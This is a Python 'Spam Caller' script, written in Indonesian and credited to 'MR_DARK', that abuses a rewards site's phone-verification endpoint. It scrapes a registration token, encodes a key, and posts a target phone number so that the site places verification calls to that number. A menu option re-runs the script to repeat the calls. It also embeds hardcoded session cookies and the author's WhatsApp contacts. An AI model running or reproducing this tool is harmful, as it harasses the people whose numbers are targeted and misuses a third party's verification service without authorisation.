# Scripted By MR_DARK
# Blom subs g boleh dec >_<
# OPEN SOURCE spesial 4k subs :)

import requests, base64, sys, time, os
def ketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./500)
abu="\033[1;90m"
biru="\033[1;96m"
putih="\033[1;97m"
hijau="\033[1;32m"
merah="\033[1;31m"
ungu="\033[1;95m"
W=putih
R=merah
G=hijau
B=biru
y="\033[1;33m"
banner = f"""
{merah}⌜                                             {merah}⌝
   {biru}╔═╗{W}┌─┐┬  ┬   {merah}╦{putih}┌┬┐ {abu}|-{merah}»{biru}⟩ {putih}Creator {merah}: {putih}DARK-02
   {biru}║  {W}├─┤│  │   {merah}║{W} ││ {abu}|-{merah}»{biru}⟩ {putih}YouTube {merah}: {putih}MR_DARK
   {B}╚═╝{W}┴ ┴┴─┘┴─┘ {merah}╩{W}─┴┘ {abu}|-{merah}»{biru}⟩ {hijau}Caller Prank
           {y}<{R}/{y}>\033[1;0m\033[1;41mSpam Caller V1.0\033[1;0m{y}<{R}/{y}>
{merah}⌞                                             {merah}⌟
{W}┬───{R}⟨{W}Menu{R}⟩{W}────────────────
{W}├─{ungu}⟩ {W}1{R}.{W}Start Spam Call {R}({W}Call{R})
{W}├─{ungu}⟩ {W}2{R}.{W}Contact {R}({W}OWNER{R})
{W}├─{ungu}⟩ {W}3{R}.{W}Join Komunitas {R}({G}WhatsApp{R})
{W}├─{ungu}⟩ {R}0{R}.{W}Exit {R}({W}Keluar{R})
{W}└─────────────────────────
"""
cookies = {
    'PHPSESSID': '4gv2i24rks9qmded1n2f373aoc',
    'DAPROPS': '"sjs.webGlRenderer:ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdeviceAspectRatio:16/9|sdevicePixelRatio:1.25|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:0|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|buserMedia:1|bjs.battery:0"',
    '_gid': 'GA1.2.228921802.1657547430',
    '_gat_gtag_UA_17308739_8': '1',
    '_ga_D7RX0XFPC1': 'GS1.1.1657547430.1.1.1657547432.0',
    '_ga': 'GA1.1.1003791473.1657547430',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # Requests sorts cookies= alphabetically
    # 'Cookie': 'PHPSESSID=4gv2i24rks9qmded1n2f373aoc; DAPROPS="sjs.webGlRenderer:ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdeviceAspectRatio:16/9|sdevicePixelRatio:1.25|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:0|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|buserMedia:1|bjs.battery:0"; _gid=GA1.2.228921802.1657547430; _gat_gtag_UA_17308739_8=1; _ga_D7RX0XFPC1=GS1.1.1657547430.1.1.1657547432.0; _ga=GA1.1.1003791473.1657547430',
    'Origin': 'https://id.jagreward.com',
    'Referer': 'https://id.jagreward.com/member/register/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '" Not;A Brand";v="99", "Microsoft Edge";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
os.system("clear")
ketik(f"{merah}>{W} OPEN SOURCE PROJECT")
time.sleep(1)
ketik(f"{merah}>{W} Scripted by MR_DARK")
time.sleep(1)
os.system("clear")
ketik(banner)
s = requests.Session()
dark = s.get('https://id.jagreward.com/member/register/', headers=headers).text

darktoken = 'data-token="'
if darktoken in dark:
	token = dark.split('data-token="')[1].split('"')[0]
	darkkey = dark.split('data-time="')[1].split('"')[0]
else:
	print ("kegagalan scrape telah terjadi!\ndisarankan untuk langsung kontak: 081327441039 via whatsapp")
	exit()
darkkeystr = str(darkkey)
darkencsatu = darkkeystr.encode('ascii')
darkencdua = base64.b64encode(darkencsatu)
darkhasilenc = darkencdua.decode('ascii')
data = {
    'token': token,
    'key': darkhasilenc,
}
tanya = input(f"{W}Pilih {B}»{R}⟩{G} ")
if tanya == "1":
	nomor = input(f"{W}Nomor Target {B}»{R}⟩{merah} ")
	#print (f"~> {darkhasilenc}")
	response = s.post(f'https://id.jagreward.com/member/verify-mobile-2/{nomor}/', headers=headers, data=data).text
	#print (f"{W}raw {abu}-{G}[{W}{response}{G}]")
	datas = {
	    'mobile': nomor,
	}

	responses = s.post('https://id.jagreward.com/member/find-verification-call-status/', headers=headers, data=datas).text
	print (f"{W}raw {abu}-{G}[{W}{responses}{G}]")
	if 'calling' in responses:
		print (f"{W}Status {abu}-{biru}⟩  {G}Sukses")
		ulang = input(f"{W}[{merah}?{W}] spam lagi{biru}? {W}({G}ya{W}/{merah}no{W}){merah}: {W}")
		if 'y' in ulang:
			os.system("python main.py")
		else:
			print ("session closed")
			exit()
	else:
		print (f"{W}Status {abu}-{biru}⟩  {merah}Gagal")
		ulang = input(f"{W}[{merah}?{W}] coba lagi{biru}? {W}({G}ya{W}/{merah}no{W}){merah}: {W}")
		if 'y' in ulang:
			os.system("python main.py")
		else:
			print ("session closed")
			exit()
elif tanya == "3":
	os.system("xdg-open https://chat.whatsapp.com/GfDPRMb91AD8UXpD2jbJVD")
elif tanya == "2":
	os.system("xdg-open https://wa.me/6281327441039")
elif tanya == "0":
	exit()
else:
	print (f"{merah}Error {W}input diluar dari table{merah}!")
	time.sleep(1)
	os.system("python3 main.py")
